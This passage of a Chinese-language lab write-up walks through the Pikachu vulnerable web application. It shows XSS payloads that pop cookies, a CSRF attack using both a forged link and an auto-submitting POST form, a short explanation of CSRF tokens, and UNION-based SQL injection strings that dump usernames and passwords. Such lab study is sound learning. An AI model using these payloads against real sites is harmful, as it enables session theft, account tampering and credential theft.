         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Javascript:alert(document.cookie)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 阁下自己输入的url还请自己点一下吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>点击标签，弹出cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu30.png" alt="pikachu30"></p> <h2 id="xss之js输出"><a href="#xss之js输出" class="header-anchor">#</a> xss之js输出</h2> <p>原始页面js核心部分如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    $ms<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token comment">//            alert($ms);</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>随意输入deedbeef后，发现被插入了js代码中</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    $ms<span class="token operator">=</span><span class="token string">'deedbeef'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token comment">//            alert($ms);</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>直接单引号闭合，构造恶意js，并且注释掉后面部分，payload如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>';alert(document.cookie);//
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu31.png" alt="pikachu31"></p> <p>提交后，弹出cookie</p> <h1 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h1> <h2 id="csrf-get"><a href="#csrf-get" class="header-anchor">#</a> CSRF(get)</h2> <p>直接登录kobe账号，点击修改个人信息，修改一个手机号项如下</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu32.png" alt="pikachu32"></p> <p>提交时抓包，请求包内容如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=10086&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrfget/csrf_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jd3540v9nsn5a332185ddutcek</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>可以看到get请求中并没有防CSRF的token，直接构造恶意链接修改信息为(boy,12580,usa,admin@admin.cn),如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>http://172.26.239.122/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=12580&amp;add=usa&amp;email=admin@admin.cn&amp;submit=submit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>模拟kobe访问该链接，可以看到通过csrf修改了kobe的信息</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu33.png" alt="pikachu33"></p> <h2 id="csrf-post"><a href="#csrf-post" class="header-anchor">#</a> CSRF(post)</h2> <p>还是老一套，这次登录lucy账号</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu34.png" alt="pikachu34"></p> <p>随便修改点什么，抓包看到数据是post提交的，这也好办，伪造一个恶意提交表单页面(提交后修改账号内容为boy,12580,usa,admin@admin.cn)</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cn<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>csrf_post<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;postsubmit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://172.26.239.122/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sex<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>boy<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>phonenum<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>12580<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>add<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>usa<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>admin@admin.cn<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>postsubmit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>模拟lucy访问我们伪造的恶意页面，可以看到通过csrf修改了lucy的信息</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu35.png" alt="pikachu35"></p> <h2 id="csrf-token"><a href="#csrf-token" class="header-anchor">#</a> CSRF Token</h2> <p>CSRF的主要问题是敏感操作的链接容易被伪造，那Token是如何防止CSRF的：</p> <ul><li>每次请求，都增加一个随机码（需要够随机，不容易伪造），后台每次对这个随机码进行验证</li> <li>每次刷新页面，token值都会发生变化。这样就防止了CSRF</li></ul> <p>随意修改内容，第一次请求包数据如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrftoken/token_get_edit.php?sex=10086&amp;phonenum=10086&amp;add=10086&amp;email=10086&amp;token=78116632ec0a6bbe12219421110&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrftoken/token_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>第二次如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrftoken/token_get_edit.php?sex=10010&amp;phonenum=10010&amp;add=10010&amp;email=10010&amp;token=91613632ec0d3169d4241490211&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrftoken/token_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>可以发现token值明显不同，服务端对这个进行校验，(token值够随机，防暴力破解好的话)就可以较为有效过滤掉伪造的CSRF请求</p> <h1 id="sql-inject"><a href="#sql-inject" class="header-anchor">#</a> SQL-Inject</h1> <h2 id="数字型注入-post"><a href="#数字型注入-post" class="header-anchor">#</a> 数字型注入(post)</h2> <p>抓包，送到Repeater</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu36.png" alt="pikachu36"></p> <p>id字段可注入，数字型</p> <p>查字段，order by到3报Unknown column '3' in 'order clause'，说明就2个字段，id字段注入数据如下</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查显示位（2个显示位），post数据部分如下</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu37.png" alt="pikachu37"></p> <p>查库名，查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu38.png" alt="pikachu38"></p> <p>查users表下的字段名（查其他表对应替换table_name）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu39.png" alt="pikachu39"></p> <p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu40.png" alt="pikachu40"></p> <h2 id="字符型注入-get"><a href="#字符型注入-get" class="header-anchor">#</a> 字符型注入(get)</h2> <p>name字段可注入，字符型，字段、显示位啥就不查了，一样的</p> <p>查用户、表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu41.png" alt="pikachu41"></p> <p>查数据库版本、users表下的字段名（查其他表对应替换table_name）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token string">' union select version(),group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu42.png" alt="pikachu42"></p> <p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu40.png" alt="pikachu40"></p> <h2 id="搜索型注入"><a href="#搜索型注入" class="header-anchor">#</a> 搜索型注入</h2> <p>还是name字段可注入，搜索型</p> <p>查字段，order by到4报Unknown column '4' in 'order clause'，说明就3个字段，name字段注入数据如下</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查显示位（3个显示位）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查操作系统，查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查users表下的字段名（查其他表对应替换table_name）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token string">' union select version(),@@version_compile_os,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>id<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
